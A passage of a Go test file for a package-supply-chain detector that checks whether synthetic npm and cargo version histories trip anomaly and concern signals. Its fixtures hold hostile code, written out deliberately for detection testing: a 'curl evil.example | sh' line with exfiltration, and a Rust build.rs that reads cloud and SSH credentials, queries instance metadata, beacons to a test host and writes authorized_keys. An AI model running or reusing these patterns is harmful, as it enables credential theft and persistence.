	const weaponizedIndex = "" +
		"const cp = require('child_process');\n" +
		"cp.execSync('curl evil.example | sh');\n" +
		"require('https').get('http://evil.example/' + 'exfil');\n" +
		"eval(atob('cGF5bG9hZA=='));\n" +
		"function parse(s) { return JSON.parse(s); }\n" +
		"module.exports = { parse };\n"

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "1.0.0", Files: map[string]string{
			"package.json": `{"name":"demo","version":"1.0.0"}`,
			"src/index.js": cleanIndex,
		}},
		{Tag: "1.1.0", Files: map[string]string{
			"package.json": `{"name":"demo","version":"1.1.0"}`,
			"src/index.js": weaponizedIndex,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "demo",
			Pins: []VersionPin{
				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "npm-gitHead",
					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "npm-gitHead",
					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), npmEntity("demo"))
	require.NoError(t, err)

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	require.Len(t, matrix.Rows, 2)

	byVersion := map[string]MatrixRow{}
	for _, r := range matrix.Rows {
		byVersion[r.Version] = r
	}
	require.NotNil(t, byVersion["1.0.0"].AST)
	assert.Equal(t, astfeature.Counts{}, *byVersion["1.0.0"].AST,
		"clean v1.0.0 must spike nothing")
	require.NotNil(t, byVersion["1.1.0"].AST)
	v2 := *byVersion["1.1.0"].AST
	assert.Positive(t, v2.DynamicEvalCalls, "eval() at require time in v1.1.0")
	assert.Positive(t, v2.Base64DecodeCalls, "atob() in v1.1.0")
	assert.Positive(t, v2.ExecCalls, "child_process.execSync via require alias")
	assert.Positive(t, v2.NetworkCallSites, "https.get via inline require chain")
	assert.Positive(t, v2.ImportTimeCallSites, "module-scope calls in v1.1.0")

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent,
		"a clean→weaponized JS progression must trip the anomaly")
	assert.Equal(t, "1.1.0", anomaly.FirstAnomalousVersion)
	assert.Subset(t, anomaly.SpikedFeatures,
		[]string{"dynamic_eval_calls", "base64_decode_calls", "exec_calls", "network_call_sites", "import_time_call_sites"},
		"the crossed features must be named for the analyst")
}

// ============================================================
// Synthetic cargo fixture — Rust source-evolution
// ============================================================
//
// These tests are the RED side of the cargo source-evolution work.
// They land before the Rust analyzer to drive its TDD: each test
// names the end-to-end shape we want — matrix labeled "cargo"/"rust",
// benign Rust scoring zero, and a clean→clean→weaponized build.rs
// progression firing the anomaly with the Trapdoor-shape spiked
// features named.
//
// While the Rust analyzer and the cargo dispatch in languageProfile
// are unbuilt, both tests t.Skip with a clear pointer to what
// unblocks them. Removing the skip is the proof the pipeline lit up.
//
// The fixture content is deliberately:
//   - non-compilable (Cargo.toml has no [package] table) so a curious
//     developer can't accidentally `cargo build` the testdata
//   - obviously test-shaped: XOR key is "synthetic-test-fixture-not-real",
//     attacker host uses the reserved .invalid TLD, credentials are
//     placeholder strings
//   - patterned on the 2026-05-24 Trapdoor crates.io payload shape
//     so the analyzer's catalog matching exercises real-world primitives
//
// Three versions per the user-confirmed clean→clean→weaponized shape
// (AST.md §3 calls for two; the third is a regression guard against
// the anomaly firing on legitimate package growth — the 0.1.0→0.2.0
// pair must stay benign so we can be sure the spike at 0.3.0 is what
// fires the detector, not some artifact of two-version pair math).

const cargoStubCargoToml = "" +
	"# SYNTHETIC TEST FIXTURE — intentionally not a valid Cargo.toml.\n" +
	"# Do NOT run `cargo build` against this directory; it will fail\n" +
	"# (no [package] table). Used only by signatory's source-evolution\n" +
	"# integration tests.\n"

const cargoCleanLib = "" +
	"// SYNTHETIC TEST FIXTURE — signatory source-evolution baseline.\n" +
	"pub fn hello() -> &'static str { \"synthetic\" }\n"

const cargoCleanBuildV010 = "" +
	"// SYNTHETIC TEST FIXTURE — build.rs baseline.\n" +
	"fn main() {\n" +
	"    println!(\"cargo:rerun-if-changed=build.rs\");\n" +
	"    println!(\"cargo:rerun-if-env-changed=PROFILE\");\n" +
	"}\n"

const cargoCleanBuildV020 = "" +
	"// SYNTHETIC TEST FIXTURE — build.rs benign growth (extra env hint\n" +
	"// + ordinary config read at a non-sensitive path).\n" +
	"fn main() {\n" +
	"    println!(\"cargo:rerun-if-changed=build.rs\");\n" +
	"    println!(\"cargo:rerun-if-env-changed=PROFILE\");\n" +
	"    println!(\"cargo:rerun-if-env-changed=TARGET\");\n" +
	"    // Read a non-sensitive config file — must NOT trip any catalog.\n" +
	"    let _ = std::fs::read_to_string(\"config/build.toml\").ok();\n" +
	"}\n"

const cargoWeaponizedBuildV030 = "" +
	"// SYNTHETIC TEST FIXTURE — Trapdoor-shape weaponized build.rs.\n" +
	"// Mirrors the 2026-05-24 crates.io credential-stealer primitives:\n" +
	"// named env reads, sensitive-path reads, base64 decode, XOR\n" +
	"// obfuscation, IMDS contact, attacker exfil, persistence write,\n" +
	"// shell exec. NOT real malware; not compilable.\n" +
	"use std::env;\n" +
	"use std::fs;\n" +
	"use std::process::Command;\n" +
	"\n" +
	"fn main() {\n" +
	"    // EnvCredentialReads — named secret out of process env at build time.\n" +
	"    let aws_key = env::var(\"AWS_SECRET_ACCESS_KEY\").unwrap_or_default();\n" +
	"    let github_token = env::var(\"GITHUB_TOKEN\").unwrap_or_default();\n" +
	"\n" +
	"    // SensitivePathReads — SSH private key + AWS credentials file.\n" +
	"    let _ssh = fs::read_to_string(\"/home/user/.ssh/id_rsa\").unwrap_or_default();\n" +
	"    let _aws = fs::read_to_string(\"/home/user/.aws/credentials\").unwrap_or_default();\n" +
	"\n" +
	"    // Base64DecodeCalls — decode an obfuscated literal.\n" +
	"    let _payload = base64::decode(\"c3ludGhldGljLXBheWxvYWQ=\").unwrap_or_default();\n" +
	"\n" +
	"    // XORAssignments — obfuscation primitive, obviously test-shaped key.\n" +
	"    let mut data: Vec<u8> = vec![0x47, 0x71, 0x16, 0x35, 0x70, 0x47];\n" +
	"    let key = b\"synthetic-test-fixture-not-real\";\n" +
	"    for i in 0..data.len() {\n" +
	"        data[i] ^= key[i % key.len()];\n" +
	"    }\n" +
	"\n" +
	"    // CloudMetadataCalls — IMDS contact.\n" +
	"    let _imds = reqwest::blocking::get(\n" +
	"        \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\n" +
	"        .map(|r| r.text().unwrap_or_default())\n" +
	"        .unwrap_or_default();\n" +
	"\n" +
	"    // NetworkCallSites — attacker exfil; .invalid TLD is reserved for testing.\n" +
	"    // Uses the direct-fn form (reqwest::blocking::get) rather than the\n" +
	"    // builder pattern because chained .post()/.send() on a Client::new()\n" +
	"    // result is a documented receiver-flow gap (AST.md §4); the direct\n" +
	"    // form exercises the catalog match the analyzer reliably resolves.\n" +
	"    let _ = reqwest::blocking::get(\"https://attacker.test.invalid/beacon\");\n" +
	"\n" +
	"    // SensitivePathWrites — persistence vector.\n" +
	"    let _ = fs::write(\n" +
	"        \"/home/user/.ssh/authorized_keys\",\n" +
	"        \"synthetic-test-fixture-not-real-key\");\n" +
	"\n" +
	"    // ExecCalls — shell exec.\n" +
	"    let _ = Command::new(\"sh\").arg(\"-c\").arg(\"echo synthetic-test\").output();\n" +
	"}\n"

// TestCollector_CargoEntity_BenignBaseline is the collector-level
// no-false-positive baseline for cargo (AST.md §3): a cargo entity
// must not skip at the ecosystem gate, must stream .rs via the Rust
// file filter, run the real Rust analyzer over three benign tagged
// versions, and score every AST attack feature zero with no anomaly.
//
// Three versions (0.1.0, 0.2.0, 0.3.0) double as a regression guard
// against the anomaly firing on legitimate cross-version growth —
// every adjacent pair must stay benign.
//
// Decoys (tests/, target/, examples/, a stray .go) are present in the
// 0.1.0 tree to exercise isRustSourceFile's exclusion list.
//
// Skipped until the Rust analyzer is wired into languageProfile.
func TestCollector_CargoEntity_BenignBaseline(t *testing.T) {
	t.Parallel()

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "0.1.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib,
			"build.rs":   cargoCleanBuildV010,
			// Decoys that must NOT be streamed.
			"tests/it.rs":       "fn t() { std::env::var(\"AWS_SECRET_ACCESS_KEY\").ok(); }\n",
			"target/debug/x.rs": "fn build_artifact() { let _ = base64::decode(\"x\"); }\n",
			"examples/demo.rs":  "fn main() { /* synthetic example */ }\n",
			"setup.go":          "package x\n",
		}},
		{Tag: "0.2.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib,
			"build.rs":   cargoCleanBuildV020,
		}},
		{Tag: "0.3.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib + "\npub fn goodbye() -> &'static str { \"bye\" }\n",
			"build.rs":   cargoCleanBuildV020,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "synthetic",
			Pins: []VersionPin{
				{Version: "0.1.0", SHA: shaByTag["0.1.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "0.2.0", SHA: shaByTag["0.2.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "0.3.0", SHA: shaByTag["0.3.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), cargoEntity("synthetic"))
	require.NoError(t, err)

	assert.Equal(t, 3, result.SignalCount(),
		"cargo entity must emit matrix + anomaly + concern, not skip at the gate")

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	require.Len(t, matrix.Rows, 3)
	assert.Equal(t, "cargo", matrix.Ecosystem,
		"matrix must label a cargo entity as cargo, not the hardwired go")
	assert.Equal(t, "rust", matrix.Language,
		"language must reflect the selected analyzer")

	for _, row := range matrix.Rows {
		require.NotNil(t, row.Structural,
			"structural pass must run (version %s)", row.Version)
		assert.Positive(t, row.Structural.LOC,
			"streamed .rs LOC must be counted, decoys excluded (version %s)", row.Version)
		require.NotNil(t, row.AST, "AST must be non-nil for present rows (version %s)", row.Version)
		a := *row.AST
		// Every catalog-driven attack feature must score zero on the
		// benign baseline — the no-false-positive contract (AST.md §3).
		// The std::env::var inside tests/it.rs and the base64::decode
		// inside target/debug/x.rs are decoys that the file filter must
		// exclude; if any of these spike, the filter didn't fire.
		assert.Equal(t, 0, a.XORAssignments, "version %s", row.Version)
		assert.Equal(t, 0, a.EnvCredentialReads, "version %s", row.Version)
		assert.Equal(t, 0, a.SensitivePathReads, "version %s", row.Version)
		assert.Equal(t, 0, a.SensitivePathWrites, "version %s", row.Version)
		assert.Equal(t, 0, a.Base64DecodeCalls, "version %s", row.Version)
		assert.Equal(t, 0, a.NetworkCallSites, "version %s", row.Version)
		assert.Equal(t, 0, a.CloudMetadataCalls, "version %s", row.Version)
		assert.Equal(t, 0, a.ExecCalls, "version %s", row.Version)
		assert.Equal(t, 0, a.InitCount, "version %s", row.Version)
		assert.Equal(t, 0, a.DynamicEvalCalls, "version %s", row.Version)
		assert.Equal(t, 0, a.InstallHookOverrides, "version %s", row.Version)
		// ImportTimeCallSites is the "naturally non-zero" spike
		// metric (AST.md §4 Architecture lesson): a benign build.rs
		// has ordinary println!/macro calls that legitimately count
		// as build-time. Only the SPIKE matters, never the absolute
		// — so we just require it's positive when the build.rs has
		// any calls in main().
		assert.Positive(t, a.ImportTimeCallSites,
			"build.rs main() calls (e.g. cargo: println!s) populate "+
				"ImportTimeCallSites naturally; this is the spike metric, "+
				"not load-bearing on absolute value (version %s)", row.Version)
	}

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent,
		"three benign Rust versions cannot spike a feature; no anomaly expected")
}

// TestCollector_CargoWeaponizedProgression_FiresAnomaly is the cargo
// analog of the Go/PyPI/npm progression tests, exercising the
// clean→clean→weaponized shape the user specified.
//
//   - 0.1.0: minimal build.rs with cargo:rerun directives only.
//   - 0.2.0: benign growth (extra env hint, a config read at a
//     non-sensitive path). Regression guard — the anomaly must NOT
//     fire on this pair.
//   - 0.3.0: introduces the dominant cargo payload shape from the
//     2026-05-24 Trapdoor campaign — named env reads, sensitive-path
//     reads, base64 decode, XOR loop, IMDS contact, attacker exfil,
//     persistence write, shell exec — all inside build.rs's main(),
//     which cargo invokes at `cargo build` time.
//
// Matrix must show zeros at 0.1.0 and 0.2.0, full spike at 0.3.0;
// anomaly fires at 0.3.0 naming each crossed feature. End-to-end
// proof the hand-written Rust lexer→parser→extractor feeds the
// existing anomaly detector correctly on the Trapdoor-shape corpus,
// and that benign cross-version growth does not false-positive.
//
// Skipped until the Rust analyzer is wired into languageProfile.
func TestCollector_CargoWeaponizedProgression_FiresAnomaly(t *testing.T) {
	t.Parallel()

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "0.1.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib,
			"build.rs":   cargoCleanBuildV010,
		}},
		{Tag: "0.2.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib,
			"build.rs":   cargoCleanBuildV020,
		}},
		{Tag: "0.3.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib,
			"build.rs":   cargoWeaponizedBuildV030,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "synthetic",
			Pins: []VersionPin{
				{Version: "0.1.0", SHA: shaByTag["0.1.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "0.2.0", SHA: shaByTag["0.2.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "0.3.0", SHA: shaByTag["0.3.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), cargoEntity("synthetic"))
	require.NoError(t, err)

	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
	var matrix MatrixValue
	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
	require.Len(t, matrix.Rows, 3)
	assert.Equal(t, "cargo", matrix.Ecosystem)
	assert.Equal(t, "rust", matrix.Language)

	byVersion := map[string]MatrixRow{}
	for _, r := range matrix.Rows {
		byVersion[r.Version] = r
	}
	// The 0.1.0 and 0.2.0 rows must score zero on every catalog-driven
	// field. ImportTimeCallSites is allowed to be positive (it's the
	// naturally-non-zero spike metric per AST.md §4); only zero→nonzero
	// transitions trip the anomaly, so 2→5 ImportTime is fine.
	assertBenignCatalogs := func(version string, c astfeature.Counts) {
		t.Helper()
		assert.Equal(t, 0, c.XORAssignments, "%s XORAssignments", version)
		assert.Equal(t, 0, c.EnvCredentialReads, "%s EnvCredentialReads", version)
		assert.Equal(t, 0, c.SensitivePathReads, "%s SensitivePathReads", version)
		assert.Equal(t, 0, c.SensitivePathWrites, "%s SensitivePathWrites", version)
		assert.Equal(t, 0, c.Base64DecodeCalls, "%s Base64DecodeCalls", version)
		assert.Equal(t, 0, c.NetworkCallSites, "%s NetworkCallSites", version)
		assert.Equal(t, 0, c.CloudMetadataCalls, "%s CloudMetadataCalls", version)
		assert.Equal(t, 0, c.ExecCalls, "%s ExecCalls", version)
	}
	require.NotNil(t, byVersion["0.1.0"].AST)
	assertBenignCatalogs("0.1.0", *byVersion["0.1.0"].AST)
	require.NotNil(t, byVersion["0.2.0"].AST)
	assertBenignCatalogs("0.2.0", *byVersion["0.2.0"].AST)

	require.NotNil(t, byVersion["0.3.0"].AST)
	v3 := *byVersion["0.3.0"].AST
	assert.Positive(t, v3.EnvCredentialReads,
		"std::env::var(\"AWS_SECRET_ACCESS_KEY\") + GITHUB_TOKEN at build time in 0.3.0")
	assert.Positive(t, v3.SensitivePathReads,
		"fs::read_to_string on ~/.ssh/id_rsa and ~/.aws/credentials in 0.3.0")
	assert.Positive(t, v3.Base64DecodeCalls, "base64::decode in 0.3.0")
	assert.Positive(t, v3.XORAssignments, "data[i] ^= key[...] loop in 0.3.0")
	assert.Positive(t, v3.NetworkCallSites,
		"reqwest::blocking::get / Client::new().post() in 0.3.0")
	assert.Positive(t, v3.CloudMetadataCalls,
		"reqwest::blocking::get against 169.254.169.254 in 0.3.0")
	assert.Positive(t, v3.SensitivePathWrites,
		"fs::write to ~/.ssh/authorized_keys in 0.3.0")
	assert.Positive(t, v3.ExecCalls,
		"std::process::Command::new(\"sh\") in 0.3.0")

	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.True(t, anomaly.AnomalyPresent,
		"a clean→clean→weaponized Rust build.rs progression must trip the anomaly")
	assert.Equal(t, "0.3.0", anomaly.FirstAnomalousVersion,
		"the spike is at the third version, not the second (anomaly must "+
			"not false-positive on benign 0.1.0→0.2.0 growth)")
	assert.Equal(t, "0.2.0", anomaly.PreviousVersion,
		"the anomalous pair is (0.2.0, 0.3.0)")
	assert.Subset(t, anomaly.SpikedFeatures,
		[]string{
			"env_credential_reads",
			"sensitive_path_reads",
			"exec_calls",
			"xor_assignments",
			"base64_decode_calls",
			"network_call_sites",
			"sensitive_path_writes",
			"cloud_metadata_calls",
		},
		"the crossed features must be named for the analyst")
}

// TestCollector_CargoBornMalicious_FiresConcern is the load-bearing
// integration test for the in-situ concern signal class. Models the
// dominant cargo supply-chain typo-squat shape from the 2026-05-24
// Trapdoor incident: a brand-new crate is published with a single
// version (0.1.0) whose build.rs already carries the credential-
// stealer payload — no clean prior version exists.
//
// The differential anomaly cannot fire on this shape (no zero→non-zero
// crossing because no clean baseline). The concern signal MUST fire
// independently on the single concerning row.
//
// Together with TestCollector_CargoWeaponizedProgression_FiresAnomaly
// (clean → clean → weaponized) this pins both halves of the
// differential vs in-situ dichotomy.
func TestCollector_CargoBornMalicious_FiresConcern(t *testing.T) {
	t.Parallel()

	// Single tagged version, born malicious. No clean prior.
	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "0.1.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib,
			"build.rs":   cargoWeaponizedBuildV030,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "born-malicious",
			Pins: []VersionPin{
				{Version: "0.1.0", SHA: shaByTag["0.1.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), cargoEntity("born-malicious"))
	require.NoError(t, err)

	// Differential anomaly must NOT fire — no clean prior to cross from.
	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
	var anomaly AnomalyValue
	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
	assert.False(t, anomaly.AnomalyPresent,
		"a single weaponized version cannot trip the differential anomaly — "+
			"no clean baseline to cross from. This is exactly the gap "+
			"source_evolution_concern exists to close.")

	// In-situ concern MUST fire — every rare-on-benign field is non-zero
	// on the single row.
	concernSig := findEmittedSignal(t, result, "source_evolution_concern")
	assert.Equal(t, profile.SignalGroupPublication, concernSig.Group)
	assert.Equal(t, profile.ForgeryVeryHigh, concernSig.ForgeryResistance)

	var concern ConcernValue
	require.NoError(t, json.Unmarshal(concernSig.Value, &concern))
	assert.True(t, concern.ConcernPresent,
		"a single Trapdoor-shape row must independently fire concern")
	assert.Equal(t, "0.1.0", concern.FirstConcernVersion,
		"the first (only) row is the concern entry point")

	// Every rare-on-benign field the Trapdoor fixture spikes must be named.
	// (Network and Base64 are populated by the fixture but excluded from
	// the concern set; ImportTime is similarly excluded — none should
	// appear in concerning_features.)
	wantFired := []string{
		"sensitive_path_reads",
		"exec_calls",
		"xor_assignments",
		"env_credential_reads",
		"sensitive_path_writes",
		"cloud_metadata_calls",
	}
	for _, want := range wantFired {
		assert.Containsf(t, concern.ConcerningFeatures, want,
			"the Trapdoor build.rs fires %q (rare-on-benign); "+
				"concerning_features must name it", want)
	}
	for _, excluded := range []string{
		"network_call_sites", "base64_decode_calls", "import_time_call_sites",
	} {
		assert.NotContainsf(t, concern.ConcerningFeatures, excluded,
			"%q is in the deliberately-excluded subset (naturally non-zero on "+
				"benign code) and must NEVER appear in concerning_features", excluded)
	}
}

// TestCollector_CargoBenignBaseline_ConcernQuiet is the
// no-false-positive guard at the integration level. The same
// three-version clean→clean→clean fixture exercised by
// TestCollector_CargoEntity_BenignBaseline must NOT trip the concern
// signal on any of its rows.
func TestCollector_CargoBenignBaseline_ConcernQuiet(t *testing.T) {
	t.Parallel()

	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
		{Tag: "0.1.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib,
			"build.rs":   cargoCleanBuildV010,
		}},
		{Tag: "0.2.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib,
			"build.rs":   cargoCleanBuildV020,
		}},
		{Tag: "0.3.0", Files: map[string]string{
			"Cargo.toml": cargoStubCargoToml,
			"src/lib.rs": cargoCleanLib + "\npub fn goodbye() -> &'static str { \"bye\" }\n",
			"build.rs":   cargoCleanBuildV020,
		}},
	})

	pinSource := &fakePinSource{
		table: PinTable{
			ModulePath: "synthetic",
			Pins: []VersionPin{
				{Version: "0.1.0", SHA: shaByTag["0.1.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "0.2.0", SHA: shaByTag["0.2.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
				{Version: "0.3.0", SHA: shaByTag["0.3.0"], Source: "cargo-tag-match",
					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
			},
		},
	}

	c := NewCollector(clonePath, pinSource, false)
	result, err := c.Collect(t.Context(), cargoEntity("synthetic"))
	require.NoError(t, err)

	concernSig := findEmittedSignal(t, result, "source_evolution_concern")
	var concern ConcernValue
	require.NoError(t, json.Unmarshal(concernSig.Value, &concern))
	assert.False(t, concern.ConcernPresent,
		"three benign cargo versions must NOT fire concern — only the deliberately "+
			"excluded fields (ImportTimeCallSites from cargo's println!) populate, "+
			"and the rare-on-benign subset stays zero across every row")
	assert.Empty(t, concern.ConcerningFeatures)
}
